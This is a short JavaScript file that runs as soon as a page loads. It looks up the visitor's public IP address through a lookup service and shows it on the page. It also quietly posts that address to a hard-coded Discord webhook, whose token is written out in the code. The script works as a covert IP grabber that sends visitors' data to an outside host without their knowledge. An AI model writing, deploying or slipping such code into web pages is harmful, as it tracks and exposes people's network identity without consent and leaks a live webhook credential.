function koko() {
    var ip = '';
    fetch('https://api.ipify.org/?format=json')
        .then(function(response) {
            return response.json();
        })
        .then(function(data) {
            ip = data.ip;
            var webhook = 'https://discord.com/api/webhooks/1132602947864371301/WJFkDltIFd-Jw6rxyfuaDOui-yCHEDaFkUzQT54ZY2hLMi99hRVV-CdmQCy7vp6HWYT3'
            var message = {
                content: 'IP: ' + ip
            };
            
            var ipElement = document.getElementById('ip');
            ipElement.textContent = ip;

            fetch(webhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            });
        });
}

document.addEventListener('DOMContentLoaded', koko);
